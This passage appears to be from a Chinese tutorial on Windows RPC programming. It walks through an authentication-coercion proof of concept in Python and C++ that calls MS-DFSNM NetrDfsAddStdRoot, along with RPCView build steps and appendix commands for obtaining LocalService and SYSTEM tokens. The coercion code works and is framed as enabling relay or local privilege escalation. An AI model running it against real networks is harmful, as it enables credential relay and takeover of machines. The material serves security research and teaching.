                print("\x1b[1;91mfail\x1b[0m")
                print("[!] Something went wrong, check error status => %s" % str(e))
                return False
            else:
                print("\x1b[1;92msuccess\x1b[0m")
            print("[>] Binding to  ... " % (self.uuid, self.version), end="")
            sys.stdout.flush()
            try:
                self.dce.bind(uuidtup_to_bin((self.uuid, self.version)))
            except Exception as e:
                print("\x1b[1;91mfail\x1b[0m")
                print("[!] Something went wrong, check error status => %s" % str(e))
                return False
            else:
                print("\x1b[1;92msuccess\x1b[0m")
            return True
    class MS_DFSNM(RPCProtocol):
        uuid = "4fc742e0-4a10-11cf-8273-00aa004ae673"
        version = "3.0"
        pipe = r"\PIPE\netdfs"
        def NetrDfsAddStdRoot(self, listener):
            if self.dce is not None:
                print("[>] Calling NetrDfsAddStdRoot() ...")
                try:
                    request = NetrDfsAddStdRoot()
                    request['ServerName'] = '%s\x00' % listener
                    request['RootShare'] = gen_random_name() + '\x00'
                    request['Comment'] = gen_random_name() + '\x00'
                    request['ApiFlags'] = 0
                    # request.dump()
                    resp = self.dce.request(request)
                except Exception as e:
                    print(e)
            else:
                print("[!] Error: dce is None, you must call connect() first.")
    if __name__ == '__main__':
        print("Windows auth coerce using MS-DFSNM::NetrDfsAddStdRoot()\n")
        parser = argparse.ArgumentParser(add_help=True, description="Proof of concept for coercing authentication with MS-DFSNM::NetrDfsAddStdRoot()")
        parser.add_argument("-u", "--username", default="", help="Username to authenticate to the endpoint.")
        parser.add_argument("-p", "--password", default="", help="Password to authenticate to the endpoint. (if omitted, it will be asked unless -no-pass is specified)")
        parser.add_argument("-d", "--domain", default="", help="Windows domain name to authenticate to the endpoint.")
        parser.add_argument("--hashes", action="store", metavar="[LMHASH]:NTHASH", help="NT/LM hashes (LM hash can be empty)")
        parser.add_argument("--no-pass", action="store_true", help="Don't ask for password (useful for -k)")
        parser.add_argument("-k", "--kerberos", action="store_true", help="Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line")
        parser.add_argument("--dc-ip", action="store", metavar="ip address", help="IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter")
        parser.add_argument("--target-ip", action="store", metavar="ip address", help="IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it")
        parser.add_argument("listener", help="IP address or hostname of listener")
        parser.add_argument("target", help="IP address or hostname of target")
        options = parser.parse_args()
        if options.hashes is not None:
            lmhash, nthash = options.hashes.split(':')
        else:
            lmhash, nthash = '', ''
        if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
            from getpass import getpass
            options.password = getpass("Password:")
        protocol = MS_DFSNM()
        connected = protocol.connect(
            username=options.username,
            password=options.password,
            domain=options.domain,
            lmhash=lmhash,
            nthash=nthash,
            target=options.target,
            doKerberos=options.kerberos,
            dcHost=options.dc_ip,
            targetIp=options.target_ip
        )
        if connected:
            protocol.NetrDfsAddStdRoot(options.listener)
        sys.exit()
## RPC编程流程-C++（MS-DFSNM）
### 通过微软文档获得IDL文件
#### 获得完整的IDL文件
根据微软文档，我们可以拿到MS-DFSNM的完整IDL。将其全部复制成文件重命名为ms-dfsnm.idl即可在Visual Studio中编译为ms-dfsnm_c.c、ms-dfsnm_s.c、ms-dfsnm_h.h文件。`xxx_s.c`文件是服务端所需文件，`xxx_c.c`文件是客户端所需文件。
如上图所示，需要导入一个名为ms-dtyp.idl的文件，我们可以在文档中搜索ms-dtyp的关键字，可以得到ms-dtyp.idl的完整文件。如下图：
### 编译IDL文件
如下图可以对idl文件进行编译
编译后可将生成的`xxx_c.c`和.h文件导入。因为我们是针对客户端编程，所以不需要`xxx_s.c`。
include .h 文件后可能会报错，这些报错大部分应该是因为包含顺序问题导致的。但是不知道怎么调整包含顺序。
如果能把ms-dtyp.h放在最后包含，应该就不会报错了
我们先通过将重复定义的去掉，再尝试编译，会发现找不到两个特殊的函数。
通过微软文档可以得到这两个函数的内容是什么
此时我们终于可以成功生成。
### RPC (MS-DFSNM) 实战
首先需要了解 **RPC连接流程**
POC代码
    #include 
    #pragma comment(lib, "RpcRT4.lib")
    int wmain(int argc, wchar_t* argv[])
    {
        RPC_STATUS status;
        RPC_WSTR StringBinding;
        RPC_BINDING_HANDLE Binding;
        status = RpcStringBindingCompose(
            (RPC_WSTR)L"4FC742E0-4A10-11CF-8273-00AA004AE673",                       // UUID
            (RPC_WSTR)L"ncacn_np",      // Protocol sequence
            (RPC_WSTR)L"\\\\127.0.0.1", // IP
            (RPC_WSTR)L"\\pipe\\netdfs", // 管道
            NULL,                       // NULL
            &StringBinding              // RPC输出
        );
        wprintf(L"[*] RpcStringBindingCompose status code: %d\r\n", status);
        wprintf(L"[*] String binding: %ws\r\n", StringBinding);
        status = RpcBindingFromStringBinding(
            StringBinding,             
            &Binding                    
        );
        wprintf(L"[*] RpcBindingFromStringBinding status code: %d\r\n", status);
        status = RpcStringFree(
            &StringBinding              
        );
        wprintf(L"[*] RpcStringFree status code: %d\r\n", status);
        RpcTryExcept
        {
            // RPC操作的任意代码
        }
        RpcExcept(EXCEPTION_EXECUTE_HANDLER);
        {
            wprintf(L"Exception: %d - 0x%08x\r\n", RpcExceptionCode(), RpcExceptionCode());
        }
        RpcEndExcept
        status = RpcBindingFree(
            &Binding                    
        );
        wprintf(L"[*] RpcBindingFree status code: %d\r\n", status);
    }
    void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
    {
        return((void __RPC_FAR*) malloc(cBytes));
    }
    void __RPC_USER midl_user_free(void __RPC_FAR* p)
    {
        free(p);
    }
通过微软文档可以知道`NetrDfsAddStdRoot`函数的写法。  
最终核心代码如下：
    RpcTryExcept
        {
            LPWSTR PipeFileName;
            long result;
            PipeFileName = (LPWSTR)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
            StringCchPrintf(PipeFileName, MAX_PATH, L"\\\\127.0.0.1/pipe/qwe");
            status = NetrDfsAddStdRoot(Binding,PipeFileName,(WCHAR*)"test",(WCHAR*)"comment",NULL);
            wprintf(L"  [+] NetrDfsAddStdRoot Send Successful. status code: %d\r\n", status);
        }
运行结果如下：
通过A机器向`192.168.40.140\pipe\netdfs`请求`NetrDfsAddStdRoot`API，该API的`ServerName`参数为`\\\\192.168.40.140/pipe/qwe`。从而导致192.168.40.140收到请求后，强制去请求了`\\192.168.40.140\pipe\qwe\pipe\winreg`。
该协议的此API可导致中继或本地提权。
### 通过RPCView反编译得到IDL文件（非必要）
RPCView源码  
#### 安装cmake
#### 安装QT
需要有7z.exe
    # Update these settings according to your needs but the default values should be just fine.
    $DestinationFolder = "C:\Qt"
    $QtVersion = "qt5_5152"
    $Target = "msvc2019"
    $BaseUrl = "https://download.qt.io/online/qtsdkrepository/windows_x86/desktop"
    $7zipPath = "C:\Program Files\7-Zip\7z.exe"
    # Store all the 7z archives in a Temp folder.
    $TempFolder = Join-Path -Path $DestinationFolder -ChildPath "Temp"
    $null = [System.IO.Directory]::CreateDirectory($TempFolder)
    # Build the URLs for all the required components.
    $AllUrls = @("$($BaseUrl)/tools_qtcreator", "$($BaseUrl)/$($QtVersion)_src_doc_examples", "$($BaseUrl)/$($QtVersion)")
    # For each URL, retrieve and parse the "Updates.xml" file. This file contains all the information
    # we need to dowload all the required files.
    foreach ($Url in $AllUrls) {
        $UpdateXmlUrl = "$($Url)/Updates.xml"
        $UpdateXml = [xml](New-Object Net.WebClient).DownloadString($UpdateXmlUrl)
        foreach ($PackageUpdate in $UpdateXml.GetElementsByTagName("PackageUpdate")) {
            $DownloadableArchives = @()
            if ($PackageUpdate.Name -like "*$($Target)*") {
                $DownloadableArchives += $PackageUpdate.DownloadableArchives.Split(",") | ForEach-Object { $_.Trim() } | Where-Object { -not [string]::IsNullOrEmpty($_) }
            }
            $DownloadableArchives | Sort-Object -Unique | ForEach-Object {
                $Filename = "$($PackageUpdate.Version)$($_)"
                $TempFile = Join-Path -Path $TempFolder -ChildPath $Filename
                $DownloadUrl = "$($Url)/$($PackageUpdate.Name)/$($Filename)"
                if (Test-Path -Path $TempFile) {
                    Write-Host "File $($Filename) found in Temp folder!"
                }
                else {
                    Write-Host "Downloading $($Filename) ..."
                    (New-Object Net.WebClient).DownloadFile($DownloadUrl, $TempFile)
                }
                Write-Host "Extracting file $($Filename) ..."
                &"$($7zipPath)" x -o"$($DestinationFolder)" $TempFile | Out-Null
            }
        }
    }
#### 安装Visual Studio
微软官网下载 Visual Studio Installer，运行后点击修改。
必须要安装的有C++桌面开发以及任意一个Windows SDK。如图所示：
#### 添加缺少的RPC Runtime（非必要）
可以使用命令绕过添加缺少的RPC Runtime的报错
    RpcView.exe /force
根据RpcView的Readme可以看出，我们需要编辑RpcInternals.h文件中的版本号
具体位置如下图：
该文件需要修改的位置如下图：
找当前机器上的RPC Runtime如下图：
以上图为例，换算方法如下：
    十六进制：   0xA 0000 4A61  070E LL
    十进制：        10  0    19041 1806
#### 正式编译RPCView
根据Github文档所述，我们可以开始编译RPCView了。
编译脚本如下：
    mkdir Build\x64
    cd Build\x64
    set CMAKE_PREFIX_PATH=C:\Qt\5.15.2\msvc2019_64\
    "C:\Program Files\CMake\bin\cmake.exe" ../../ -A x64
    "C:\Program Files\CMake\bin\cmake.exe" --build . --config Release
cmake编译成功后可得到如下目录：
使用该目录下的RpcView.sln可以用Visual Studio打开并进行最后的编译。
#### 下载RPCView所需的符号文件
此bat只会下载`C:\Windows\System32\`下的DLL文件的符号文件。
    cd "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\"
    symchk /s srv*c:\SYMBOLS*https://msdl.microsoft.com/download/symbols C:\Windows\System32\*.dll
如果找不到symchk的话需要手动安装Windows SDK的Debugging Tools。安装方法如下图所示。
#### 使用RPCView反编译RPC接口
打开RPCView后，可以通过点击Pid为0的`System Idle Process`查看所有的RPC端点和RPC接口。
根据MS-DFSNM的文档可以得知我们需要找的是  
DFS 管道和UUID  
DFS 协议的进程名  
如下图所示：
通过下图可以进行反编译，右下方的框的ID分别对应着MS-DFSNM文档里面API的Opnum。  
左边中间的Decompilation里面是反编译后的代码。右边中间的Location显示了接口的文件名。  
如果下载了接口文件对应的符号文件，则会在Name的部分会显示文档中的API名称。
反编译出来的代码就是这个接口的完整IDL。不过这个RPC接口的IDL文件在微软文档中有，所以本次实验实际上是不需要这样操作的。
符号文件在此处导入：
## RPC编程流程-Python（MS-DFSNM）
github上有写好的源码
)
可以直接把模板拿来使用，需要注意的是如果要换成别的协议，需要相应的根据协议对其进行需修改。
如下图的部分：
# 附录
## 使用PSexec获得Local Service权限
    psexec -i -d -u "NT AUTHORITY\LocalService" cmd
## 安装NtObjectManager获得Local Service权限
    #设置TLS（可选）
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;
    #安装NtObjectManager
    Install-Module -Name NtObjectManager -RequiredVersion 1.1.32
    #手动安装
    # 下载包解压后放入一下目录
    C:\Program Files\WindowsPowerShell\Modules
    # 最终路径
    C:\Program Files\WindowsPowerShell\Modules\NtObjectManager\1.1.32
### 获得SYSTEM权限
    $p = Start-Win32ChildProcess powershell
### 获得LocalService权限
    $sess = Get-NtToken -Session
    $token = Get-NtToken -Service LocalService -AdditionalGroups $sess.LogonSid.Sid
    New-Win32Process cmd -Token $token -CreationFlags NewConsole